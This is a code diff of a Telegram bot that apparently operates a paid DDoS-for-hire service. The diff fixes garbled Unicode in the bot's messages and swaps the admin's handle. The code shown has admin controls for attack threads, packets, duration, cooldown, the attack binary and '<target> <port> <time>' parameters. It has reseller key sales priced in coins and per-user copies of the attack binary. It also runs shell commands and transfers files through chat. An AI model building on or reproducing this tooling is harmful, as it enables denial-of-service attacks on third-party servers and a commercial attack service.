-            bot.reply_to(message, f"âºï¸ ð—–ð—¼ð—ºð—ºð—®ð—»ð—± ð—¢ð˜‚ð˜ð—½ð˜‚ð˜:\n`{output}`", parse_mode='Markdown')
+            bot.reply_to(message, f"⏺️ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗢𝘂𝘁𝗽𝘂𝘁:\n`{output}`", parse_mode='Markdown')
         else:
-            bot.reply_to(message, "âœ… ð—–ð—¼ð—ºð—ºð—®ð—»ð—± ð—²ð˜…ð—²ð—°ð˜‚ð˜ð—²ð—± ð˜€ð˜‚ð—°ð—°ð—²ð˜€ð˜‚ð—¹ð—¹ð˜†")
+            bot.reply_to(message, "✅ 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗲𝘅𝗲𝗰𝘂𝘁𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘂𝗹𝗹𝘆")
     except Exception as e:
-        bot.reply_to(message, f"â—ï¸ ð—˜ð—¿ð—¿ð—¼ð—¿ ð—˜ð˜…ð—²ð—°ð˜‚ð˜ð—¶ð—»ð—´ ð—°ð—¼ð—ºð—ºð—®ð—»ð—±: {str(e)}")
+        bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿 𝗘𝘅𝗲𝗰𝘂𝘁𝗶𝗻𝗴 𝗰𝗼𝗺𝗺𝗮𝗻𝗱: {str(e)}")
 
 @bot.message_handler(func=lambda message: message.text == "Upload")
 def upload_to_terminal(message):
-    """Handle file upload to terminal for admins @NINJAGAMEROP."""
+    """Handle file upload to terminal for admins @VAMPIREXCHEATS."""
     user_id = str(message.chat.id)
     
     if user_id in admin_id:
-        sent_msg = bot.reply_to(message, "ðŸ“¤ ð—¦ð—²ð—»ð—± ð—® ð—³ð—¶ð—¹ð—² ð˜ð—¼ ð˜‚ð—½ð—¹ð—¼ð—®ð—±.")
+        sent_msg = bot.reply_to(message, "📤 𝗦𝗲𝗻𝗱 𝗮 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱.")
         bot.register_next_step_handler(message, process_file_upload, sent_msg.message_id)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 def upload_animation(chat_id, message_id, stop_event):
     """Looping animation for uploading progress."""
@@ -599,7 +603,7 @@ def upload_animation(chat_id, message_id, stop_event):
     i = 0
     while not stop_event.is_set():  
         try:
-            bot.edit_message_text(f"ðŸ“¤ ð—¨ð—½ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´{dots[i]}", chat_id=chat_id, message_id=message_id)
+            bot.edit_message_text(f"📤 𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴{dots[i]}", chat_id=chat_id, message_id=message_id)
             i = (i + 1) % len(dots)  # Cycle through [.", "..", "..."]
             time.sleep(0.3)  # Small delay to simulate progress
         except Exception as e:
@@ -610,7 +614,7 @@ def process_file_upload(message):
     if message.document:
         try:
             # Start uploading message
-            upload_msg = bot.reply_to(message, "ðŸ“¤ ð—¨ð—½ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´")
+            upload_msg = bot.reply_to(message, "📤 𝗨𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴")
 
             # Start animation in a separate thread
             stop_event = threading.Event()
@@ -634,29 +638,29 @@ def process_file_upload(message):
             animation_thread.join()
 
             # Convert animation message to success message
-            bot.edit_message_text(f"âœ… ð—™ð—¶ð—¹ð—² ð˜‚ð—½ð—¹ð—¼ð—®ð—±ð—²ð—± ð˜€ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†:\n`{file_path}`",  
+            bot.edit_message_text(f"✅ 𝗙𝗶𝗹𝗲 𝘂𝗽𝗹𝗼𝗮𝗱𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆:\n`{file_path}`",  
                                   chat_id=message.chat.id,  
                                   message_id=upload_msg.message_id,  
                                   parse_mode="Markdown")
 
         except Exception as e:
             stop_event.set()  # Ensure animation stops if there's an error
-            bot.reply_to(message, f"â—ï¸ ð—˜ð—¿ð—¿ð—¼ð—¿ ð˜‚ð—½ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´ ð—³ð—¶ð—¹ð—²: {str(e)}")
+            bot.reply_to(message, f"❗️ 𝗘𝗿𝗿𝗼𝗿 𝘂𝗽𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲: {str(e)}")
     else:
-        bot.reply_to(message, "â—ï¸ ð—¦ð—²ð—»ð—± ð—® ð˜ƒð—®ð—¹ð—¶ð—± ð—³ð—¶ð—¹ð—² ð˜ð—¼ ð˜‚ð—½ð—¹ð—¼ð—®ð—±.")
+        bot.reply_to(message, "❗️ 𝗦𝗲𝗻𝗱 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗳𝗶𝗹𝗲 𝘁𝗼 𝘂𝗽𝗹𝗼𝗮𝗱.")
 
 @bot.message_handler(func=lambda message: message.text == "Download")
 def list_files(message):
     user_id = str(message.chat.id)
 
     if user_id not in admin_id:
-        bot.send_message(message.chat.id, "â›” ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¢ð—»ð—¹ð˜† ð—®ð—±ð—ºð—¶ð—»ð˜€ ð—°ð—®ð—» ð—±ð—¼ð˜„ð—»ð—¹ð—¼ð—®ð—± ð—³ð—¶ð—¹ð—²ð˜€.")
+        bot.send_message(message.chat.id, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗢𝗻𝗹𝘆 𝗮𝗱𝗺𝗶𝗻𝘀 𝗰𝗮𝗻 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗳𝗶𝗹𝗲𝘀.")
         return
 
     files = [f for f in os.listdir() if os.path.isfile(f)]  # Get all files in directory
 
     if not files:
-        bot.send_message(message.chat.id, "ðŸ“ ð—¡ð—¼ ð—³ð—¶ð—¹ð—²ð˜€ ð—®ð˜ƒð—®ð—¶ð—¹ð—®ð—¯ð—¹ð—² ð—¶ð—» ð˜ð—µð—² ð—±ð—¶ð—¿ð—²ð—°ð˜ð—¼ð—¿ð˜†.")
+        bot.send_message(message.chat.id, "📁 𝗡𝗼 𝗳𝗶𝗹𝗲𝘀 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗶𝗻 𝘁𝗵𝗲 𝗱𝗶𝗿𝗲𝗰𝘁𝗼𝗿𝘆.")
         return
 
     markup = types.InlineKeyboardMarkup()
@@ -666,7 +670,7 @@ def list_files(message):
         markup.add(types.InlineKeyboardButton(file, callback_data=f"download_{file}"))
 
     # Store message ID for animation update
-    msg = bot.send_message(message.chat.id, "ðŸ“‚ ð—¦ð—²ð—¹ð—²ð—°ð˜ ð—® ð—³ð—¶ð—¹ð—² ð˜ð—¼ ð—±ð—¼ð˜„ð—»ð—¹ð—¼ð—®ð—±:", reply_markup=markup)
+    msg = bot.send_message(message.chat.id, "📂 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗳𝗶𝗹𝗲 𝘁𝗼 𝗱𝗼𝘄𝗻𝗹𝗼𝗮𝗱:", reply_markup=markup)
     bot.register_next_step_handler(msg, lambda _: None)  # Prevents further interactions
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("download_"))
@@ -674,29 +678,29 @@ def send_file(call):
     user_id = str(call.message.chat.id)
 
     if user_id not in admin_id:
-        bot.answer_callback_query(call.id, "â›” ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.answer_callback_query(call.id, "⛔ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
         return
 
     filename = call.data.replace("download_", "")
     
     if not os.path.exists(filename):
-        bot.answer_callback_query(call.id, "âŒ ð—™ð—¶ð—¹ð—² ð—»ð—¼ð˜ ð—³ð—¼ð˜‚ð—»ð—±.")
+        bot.answer_callback_query(call.id, "❌ 𝗙𝗶𝗹𝗲 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱.")
         return
 
     # Convert "Select a file" into the animated progress
-    animation_msg = bot.edit_message_text("ðŸ“¥ ð——ð—¼ð˜„ð—»ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´ ð—³ð—¶ð—¹ð—² [â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘] 0%", call.message.chat.id, call.message.message_id)
+    animation_msg = bot.edit_message_text("📥 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲 [░░░░░░░░░░] 0%", call.message.chat.id, call.message.message_id)
 
-    progress_steps = [(20, "â–“â–“â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘"), (50, "â–“â–“â–“â–“â–“â–‘â–‘â–‘â–‘â–‘"), (80, "â–“â–“â–“â–“â–“â–“â–“â–“â–‘â–‘"), (100, "â–“â–“â–“â–“â–“â–“â–“â–“â–“â–“")]
+    progress_steps = [(20, "▓▓░░░░░░░░"), (50, "▓▓▓▓▓░░░░░"), (80, "▓▓▓▓▓▓▓▓░░"), (100, "▓▓▓▓▓▓▓▓▓▓")]
     for progress, bar in progress_steps:
         time.sleep(1)
-        bot.edit_message_text(f"ðŸ“¥ ð——ð—¼ð˜„ð—»ð—¹ð—¼ð—®ð—±ð—¶ð—»ð—´ ð—³ð—¶ð—¹ð—² [{bar}] {progress}%", call.message.chat.id, animation_msg.message_id)
+        bot.edit_message_text(f"📥 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱𝗶𝗻𝗴 𝗳𝗶𝗹𝗲 [{bar}] {progress}%", call.message.chat.id, animation_msg.message_id)
 
     # Send the file after animation
     with open(filename, "rb") as file:
         bot.send_document(call.message.chat.id, file)
 
     # Convert animation into "File Sent Successfully!"
-    bot.edit_message_text("âœ… ð—™ð—¶ð—¹ð—² ð—¦ð—²ð—»ð˜ ð—¦ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†!", call.message.chat.id, animation_msg.message_id)
+    bot.edit_message_text("✅ 𝗙𝗶𝗹𝗲 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!", call.message.chat.id, animation_msg.message_id)
 
 # --------------------------------------------------------------
         
@@ -711,51 +715,51 @@ def set_threads(message):
     """Admin command to change threads."""
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        bot.reply_to(message, "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—»ð˜‚ð—ºð—¯ð—²ð—¿ ð—¼ð—³ ð˜ð—µð—¿ð—²ð—®ð—±ð˜€:")
+        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝘁𝗵𝗿𝗲𝗮𝗱𝘀:")
         bot.register_next_step_handler(message, process_new_threads)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 def process_new_threads(message):
         new_threads = message.text.strip()
         global threads
         threads = new_threads
         save_config()  # Save changes
-        bot.reply_to(message, f"âœ… ð—§ð—µð—¿ð—²ð—®ð—±ð˜€ ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: {new_threads}")
+        bot.reply_to(message, f"✅ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_threads}")
         
 @bot.message_handler(func=lambda message: message.text == "Binary")
 def set_binary(message):
     """Admin command to change the binary name."""
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        bot.reply_to(message, "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—»ð—®ð—ºð—² ð—¼ð—³ ð˜ð—µð—² ð—»ð—²ð˜„ ð—¯ð—¶ð—»ð—®ð—¿ð˜†:")
+        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝗮𝗺𝗲 𝗼𝗳 𝘁𝗵𝗲 𝗻𝗲𝘄 𝗯𝗶𝗻𝗮𝗿𝘆:")
         bot.register_next_step_handler(message, process_new_binary)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 def process_new_binary(message):
     new_binary = message.text.strip()
     global BINARY
     BINARY = new_binary
     save_config()  # Save changes
-    bot.reply_to(message, f"âœ… ð—•ð—¶ð—»ð—®ð—¿ð˜† ð—»ð—®ð—ºð—² ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: `{new_binary}`", parse_mode='Markdown')
+    bot.reply_to(message, f"✅ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: `{new_binary}`", parse_mode='Markdown')
 
 @bot.message_handler(func=lambda message: message.text == "Packets")
 def set_packets(message):
     """Admin command to change packets."""
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        bot.reply_to(message, "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—»ð˜‚ð—ºð—¯ð—²ð—¿ ð—¼ð—³ ð—½ð—®ð—°ð—¸ð—²ð˜ð˜€:")
+        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗻𝘂𝗺𝗯𝗲𝗿 𝗼𝗳 𝗽𝗮𝗰𝗸𝗲𝘁𝘀:")
         bot.register_next_step_handler(message, process_new_packets)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 def process_new_packets(message):
     new_packets = message.text.strip()
     global packets
     packets = new_packets
     save_config()  # Save changes
-    bot.reply_to(message, f"âœ… ð—£ð—®ð—°ð—¸ð—²ð˜ð˜€ ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: {new_packets}")
+    bot.reply_to(message, f"✅ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_packets}")
 
 @bot.message_handler(func=lambda message: message.text == "Parameters")
 def set_command_type(message):
@@ -768,9 +772,9 @@ def set_command_type(message):
         btn3 = types.InlineKeyboardButton("parameters 3", callback_data="arg_3")
         markup.add(btn1, btn2, btn3)
         
-        bot.reply_to(message, "ðŸ”¹ ð—¦ð—²ð—¹ð—²ð—°ð˜ ð—®ð—» ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€ ð˜ð˜†ð—½ð—²:", reply_markup=markup)
+        bot.reply_to(message, "🔹 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 𝘁𝘆𝗽𝗲:", reply_markup=markup)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("arg_"))
 def process_parameters_selection(call):
@@ -784,13 +788,13 @@ def process_parameters_selection(call):
 
     # Generate response message based on the selected parameters
     if full_command_type == 1:
-        response_message = "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ð—²ð—± ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€ 1:\n `<target> <port> <time>`"
+        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 1:\n `<target> <port> <time>`"
     elif full_command_type == 2:
-        response_message = "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ð—²ð—± ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€ 2:\n `<target> <port> <time> <threads>`"
+        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 2:\n `<target> <port> <time> <threads>`"
     elif full_command_type == 3:
-        response_message = "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ð—²ð—± ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€ 3:\n `<target> <port> <time> <packet> <threads>`"
+        response_message = "✅ 𝗦𝗲𝗹𝗲𝗰𝘁𝗲𝗱 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀 3:\n `<target> <port> <time> <packet> <threads>`"
     else:
-        response_message = "â—ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð˜€ð—²ð—¹ð—²ð—°ð˜ð—¶ð—¼ð—»."
+        response_message = "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘀𝗲𝗹𝗲𝗰𝘁𝗶𝗼𝗻."
 
     bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=response_message, parse_mode='Markdown')
         
@@ -799,10 +803,10 @@ def set_attack_cooldown(message):
     """Admin command to change attack cooldown time."""
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        bot.reply_to(message, "ðŸ•’ ð—˜ð—»ð˜ð—²ð—¿ ð—»ð—²ð˜„ ð—®ð˜ð˜ð—®ð—°ð—¸ ð—°ð—¼ð—¼ð—¹ð—±ð—¼ð˜„ð—» (ð—¶ð—» ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€):")
+        bot.reply_to(message, "🕒 𝗘𝗻𝘁𝗲𝗿 𝗻𝗲𝘄 𝗮𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
         bot.register_next_step_handler(message, process_new_attack_cooldown)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 def process_new_attack_cooldown(message):
     global ATTACK_COOLDOWN
@@ -810,19 +814,19 @@ def process_new_attack_cooldown(message):
         new_cooldown = int(message.text)
         ATTACK_COOLDOWN = new_cooldown
         save_config()  # Save changes
-        bot.reply_to(message, f"âœ… ð—”ð˜ð˜ð—®ð—°ð—¸ ð—°ð—¼ð—¼ð—¹ð—±ð—¼ð˜„ð—» ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: {new_cooldown} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€")
+        bot.reply_to(message, f"✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
     except ValueError:
-        bot.reply_to(message, "â—ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—¯ð—²ð—¿! ð—£ð—¹ð—²ð—®ð˜€ð—² ð—²ð—»ð˜ð—²ð—¿ ð—® ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—²ð—¿ð—¶ð—° ð˜ƒð—®ð—¹ð˜‚ð—².")
+        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
         
 @bot.message_handler(func=lambda message: message.text == "Attack Time")
 def set_attack_time(message):
     """Admin command to change max attack time."""
     user_id = str(message.chat.id)
     if user_id in admin_id:
-        bot.reply_to(message, "â³ ð—˜ð—»ð˜ð—²ð—¿ ð—ºð—®ð˜… ð—®ð˜ð˜ð—®ð—°ð—¸ ð—±ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—» (ð—¶ð—» ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€):")
+        bot.reply_to(message, "⏳ 𝗘𝗻𝘁𝗲𝗿 𝗺𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 (𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀):")
         bot.register_next_step_handler(message, process_new_attack_time)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 def process_new_attack_time(message):
     global MAX_ATTACK_TIME
@@ -830,9 +834,9 @@ def process_new_attack_time(message):
         new_attack_time = int(message.text)
         MAX_ATTACK_TIME = new_attack_time
         save_config()  # Save changes
-        bot.reply_to(message, f"âœ… ð— ð—®ð˜… ð—®ð˜ð˜ð—®ð—°ð—¸ ð˜ð—¶ð—ºð—² ð—°ð—µð—®ð—»ð—´ð—²ð—± ð˜ð—¼: {new_attack_time} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€")
+        bot.reply_to(message, f"✅ 𝗠𝗮𝘅 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: {new_attack_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀")
     except ValueError:
-        bot.reply_to(message, "â—ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—¯ð—²ð—¿! ð—£ð—¹ð—²ð—®ð˜€ð—² ð—²ð—»ð˜ð—²ð—¿ ð—® ð˜ƒð—®ð—¹ð—¶ð—± ð—»ð˜‚ð—ºð—²ð—¿ð—¶ð—° ð˜ƒð—®ð—¹ð˜‚ð—².")
+        bot.reply_to(message, "❗𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗯𝗲𝗿! 𝗣𝗹𝗲𝗮𝘀𝗲 𝗲𝗻𝘁𝗲𝗿 𝗮 𝘃𝗮𝗹𝗶𝗱 𝗻𝘂𝗺𝗲𝗿𝗶𝗰 𝘃𝗮𝗹𝘂𝗲.")
         
 # --------------------------------------------------------------
         
@@ -842,7 +846,7 @@ def process_new_attack_time(message):
         
 # --------------------[ KEY MANAGEMENT ]----------------------
         
-@bot.message_handler(func=lambda message: message.text == "ðŸŽŸï¸ Redeem Key")
+@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
 def redeem_key_command(message):
     user_id = str(message.chat.id)
     
@@ -850,10 +854,10 @@ def redeem_key_command(message):
     if user_id in users:
         expiration_time = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
         if expiration_time > datetime.datetime.now():
-            bot.reply_to(message, "â•ð—¬ð—¼ð˜‚ ð—®ð—¹ð—¿ð—²ð—®ð—±ð˜† ð—µð—®ð˜ƒð—² ð—®ð—°ð˜ð—¶ð˜ƒð—² ð—®ð—°ð—°ð—²ð˜€ð˜€â•")
+            bot.reply_to(message, "❕𝗬𝗼𝘂 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗵𝗮𝘃𝗲 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀❕")
             return  # User still has access, so we stop here
             
-    bot.reply_to(message, "ð—£ð—¹ð—²ð—®ð˜€ð—² ð˜€ð—²ð—»ð—± ð˜†ð—¼ð˜‚ð—¿ ð—¸ð—²ð˜†:")
+    bot.reply_to(message, "𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗸𝗲𝘆:")
     bot.register_next_step_handler(message, process_redeem_key)
 
 def process_redeem_key(message):
@@ -874,9 +878,9 @@ def process_redeem_key(message):
         user_binary = f"{BINARY}{user_id}"  # e.g., binary7469108296 
         shutil.copy(original_binary, user_binary)
 
-        bot.reply_to(message, f"âœ… ð—”ð—°ð—°ð—²ð˜€ð˜€ ð—´ð—¿ð—®ð—»ð˜ð—²ð—± ð˜‚ð—»ð˜ð—¶ð—¹: {convert_utc_to_ist(users[user_id])}")
+        bot.reply_to(message, f"✅ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝘂𝗻𝘁𝗶𝗹: {convert_utc_to_ist(users[user_id])}")
     else:
-        bot.reply_to(message, "ðŸ“› ð—žð—²ð˜† ð—²ð˜…ð—½ð—¶ð—¿ð—²ð—± ð—¼ð—¿ ð—¶ð—»ð˜ƒð—®ð—¹ð—¶ð—± ðŸ“›")
+        bot.reply_to(message, "📛 𝗞𝗲𝘆 𝗲𝘅𝗽𝗶𝗿𝗲𝗱 𝗼𝗿 𝗶𝗻𝘃𝗮𝗹𝗶𝗱 📛")
 
 # --- Bot Handlers ---
 @bot.message_handler(func=lambda message: message.text == "Generate Key")
@@ -888,7 +892,7 @@ def generate_key_command(message):
         button1 = types.InlineKeyboardButton("Generate Days", callback_data="admin_days")
         button2 = types.InlineKeyboardButton("Generate Hours", callback_data="admin_hours")
         markup.add(button1, button2)
-        bot.send_message(message.chat.id, "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ ð—±ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—» ð˜ð˜†ð—½ð—²:", reply_markup=markup)
+        bot.send_message(message.chat.id, "✅ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝘁𝘆𝗽𝗲:", reply_markup=markup)
 
     elif user_id in resellers:
         markup = types.InlineKeyboardMarkup(row_width=1)
@@ -896,9 +900,9 @@ def generate_key_command(message):
         button2 = types.InlineKeyboardButton("7 Days (400 Coins)", callback_data="select_7_days")
         button3 = types.InlineKeyboardButton("30 Days (900 Coins)", callback_data="select_30_days")
         markup.add(button1, button2, button3)
-        bot.send_message(message.chat.id, "âœ… ð—¦ð—²ð—¹ð—²ð—°ð˜ ð—® ð—±ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—»:" ,reply_markup=markup)
+        bot.send_message(message.chat.id, "✅ 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻:" ,reply_markup=markup)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—® ð—¿ð—²ð˜€ð—²ð—¹ð—¹ð—²ð—¿ ð—¼ð—¿ ð—®ð—±ð—ºð—¶ð—»")
+        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗿 𝗮𝗱𝗺𝗶𝗻")
 
 
 @bot.callback_query_handler(func=lambda call: call.data in ["admin_days", "admin_hours"])
@@ -906,13 +910,13 @@ def handle_admin_selection(call):
     user_id = str(call.message.chat.id)
 
     if user_id not in admin_id:
-        bot.answer_callback_query(call.id, "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜†")
